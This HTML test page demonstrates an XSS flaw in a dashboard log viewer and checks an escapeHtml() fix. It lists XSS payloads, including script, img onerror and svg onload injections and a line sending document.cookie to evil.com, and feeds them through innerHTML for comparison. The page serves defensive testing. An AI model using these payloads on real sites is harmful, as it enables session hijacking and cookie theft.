<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Vulnerability Test - Dashboard Log Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .test-section {
            background: white;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .test-case {
            margin: 15px 0;
            padding: 15px;
            border-left: 4px solid #007bff;
            background: #f8f9fa;
        }
        .vulnerable {
            border-color: #dc3545;
            background: #fff5f5;
        }
        .fixed {
            border-color: #28a745;
            background: #f0fff4;
        }
        .output {
            margin-top: 10px;
            padding: 10px;
            background: white;
            border: 1px solid #ddd;
            min-height: 30px;
            font-family: monospace;
            font-size: 12px;
        }
        .alert-box {
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        code {
            background: #e9ecef;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        h2 {
            color: #333;
            border-bottom: 2px solid #007bff;
            padding-bottom: 10px;
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-vulnerable { background: #dc3545; }
        .status-fixed { background: #28a745; }
    </style>
</head>
<body>
    <h1>üîí XSS Vulnerability Test - Dashboard Log Viewer</h1>

    <div class="alert-box alert-info">
        <strong>‚ÑπÔ∏è Test Purpose:</strong> This page demonstrates the XSS vulnerability in the dashboard's log viewer
        and verifies that the fix properly prevents malicious script execution.
    </div>

    <div class="test-section">
        <h2>Vulnerability Description</h2>
        <p><strong>Location:</strong> <code>dashboard/static/dashboard.js</code> - <code>displayLogs()</code> function</p>
        <p><strong>Issue:</strong> The function inserts raw log content directly into the DOM via <code>innerHTML</code> without HTML entity encoding.</p>
        <p><strong>Attack Vector:</strong> If scraped websites contain malicious content (e.g., store names with embedded JavaScript),
           viewing the logs could execute the malicious script in the admin's browser.</p>
        <p><strong>Impact:</strong> Session hijacking, cookie theft, data exfiltration, unauthorized actions</p>
    </div>

    <div class="test-section">
        <h2>Test Cases</h2>

        <div class="test-case vulnerable">
            <h3><span class="status-indicator status-vulnerable"></span>Test 1: Script Tag Injection (VULNERABLE)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</code></p>
            <div class="output" id="vulnerable-test-1"></div>
            <p><strong>Expected (vulnerable):</strong> Alert popup appears</p>
            <p><strong>Expected (fixed):</strong> Script tag displayed as text, no execution</p>
        </div>

        <div class="test-case vulnerable">
            <h3><span class="status-indicator status-vulnerable"></span>Test 2: Image onerror Handler (VULNERABLE)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;img src=x onerror="alert('XSS via onerror')"&gt;</code></p>
            <div class="output" id="vulnerable-test-2"></div>
            <p><strong>Expected (vulnerable):</strong> Alert popup appears</p>
            <p><strong>Expected (fixed):</strong> img tag displayed as text, no execution</p>
        </div>

        <div class="test-case vulnerable">
            <h3><span class="status-indicator status-vulnerable"></span>Test 3: SVG onload Handler (VULNERABLE)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;svg onload="alert('XSS via SVG')"&gt;</code></p>
            <div class="output" id="vulnerable-test-3"></div>
            <p><strong>Expected (vulnerable):</strong> Alert popup appears</p>
            <p><strong>Expected (fixed):</strong> svg tag displayed as text, no execution</p>
        </div>

        <div class="test-case vulnerable">
            <h3><span class="status-indicator status-vulnerable"></span>Test 4: Cookie Theft Simulation (VULNERABLE)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;script&gt;fetch('http://evil.com?cookie='+document.cookie)&lt;/script&gt;</code></p>
            <div class="output" id="vulnerable-test-4"></div>
            <p><strong>Expected (vulnerable):</strong> Network request to evil.com (check browser console)</p>
            <p><strong>Expected (fixed):</strong> Script tag displayed as text, no request</p>
        </div>
    </div>

    <div class="test-section">
        <h2>Fixed Implementation Test</h2>

        <div class="test-case fixed">
            <h3><span class="status-indicator status-fixed"></span>Test 5: Script Tag (FIXED)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;script&gt;alert('This should not execute')&lt;/script&gt;</code></p>
            <div class="output" id="fixed-test-1"></div>
            <p><strong>Result:</strong> Script displayed as text ‚úÖ</p>
        </div>

        <div class="test-case fixed">
            <h3><span class="status-indicator status-fixed"></span>Test 6: Image onerror (FIXED)</h3>
            <p><strong>Malicious Input:</strong> <code>&lt;img src=x onerror="alert('blocked')"&gt;</code></p>
            <div class="output" id="fixed-test-2"></div>
            <p><strong>Result:</strong> HTML displayed as text ‚úÖ</p>
        </div>

        <div class="test-case fixed">
            <h3><span class="status-indicator status-fixed"></span>Test 7: Complex Real-World Example (FIXED)</h3>
            <p><strong>Store Name:</strong> <code>Best Buy &lt;script&gt;steal()&lt;/script&gt; Store</code></p>
            <div class="output" id="fixed-test-3"></div>
            <p><strong>Result:</strong> Full string displayed safely as text ‚úÖ</p>
        </div>
    </div>

    <div class="test-section">
        <h2>Security Fix Implementation</h2>
        <p><strong>Solution:</strong> Added <code>escapeHtml()</code> function that uses DOM APIs to safely encode HTML entities:</p>
        <pre><code>function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;  // Automatically escapes HTML
    return div.innerHTML;
}</code></pre>
        <p><strong>Applied to:</strong></p>
        <ul>
            <li>All raw log content (<code>logLine.raw</code>)</li>
            <li>Log levels in both content and class attributes</li>
            <li>Timestamps</li>
            <li>Any user-controlled data before DOM insertion</li>
        </ul>
    </div>

    <div class="alert-box alert-success" id="final-status" style="display:none;">
        <strong>‚úÖ Security Status:</strong> All XSS attacks successfully blocked!
    </div>

    <div class="alert-box alert-danger" id="vulnerable-status" style="display:none;">
        <strong>‚ö†Ô∏è Security Warning:</strong> XSS vulnerabilities detected! The fix needs to be applied.
    </div>

    <script>
        // Helper function to escape HTML (vulnerable version for comparison)
        function vulnerableDisplay(html) {
            const div = document.createElement('div');
            div.innerHTML = html; // VULNERABLE: Direct HTML insertion
            return div;
        }

        // Helper function to escape HTML (fixed version)
        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str; // SAFE: Uses textContent
            return div.innerHTML;
        }

        function fixedDisplay(html) {
            const div = document.createElement('div');
            div.textContent = html; // SAFE: Renders as text
            return div;
        }

        // Track if any script executed (for automated testing)
        let vulnerabilityDetected = false;
        window.xssTestExecuted = function() {
            vulnerabilityDetected = true;
        };

        // Test cases
        const maliciousInputs = [
            '<script>xssTestExecuted(); alert("XSS Attack!")</script>',
            '<img src=x onerror="xssTestExecuted(); alert(\'XSS via onerror\')">',
            '<svg onload="xssTestExecuted(); alert(\'XSS via SVG\')">',
            '<script>fetch("http://evil.com?cookie="+document.cookie)</script>'
        ];

        const fixedInputs = [
            '<script>alert("This should not execute")</script>',
            '<img src=x onerror="alert(\'blocked\')">',
            'Best Buy <script>steal()</script> Store'
        ];

        // Run vulnerable tests
        maliciousInputs.forEach((input, index) => {
            const element = document.getElementById(`vulnerable-test-${index + 1}`);
            element.appendChild(vulnerableDisplay(input));
        });

        // Run fixed tests
        fixedInputs.forEach((input, index) => {
            const element = document.getElementById(`fixed-test-${index + 1}`);
            element.appendChild(fixedDisplay(input));
        });

        // Check results after a brief delay
        setTimeout(() => {
            const statusElement = vulnerabilityDetected
                ? document.getElementById('vulnerable-status')
                : document.getElementById('final-status');
            statusElement.style.display = 'block';

            console.log('XSS Test Results:', {
                vulnerabilityDetected,
                message: vulnerabilityDetected
                    ? 'VULNERABLE: Scripts executed'
                    : 'SECURE: All scripts blocked'
            });
        }, 1000);
    </script>
</body>
</html>
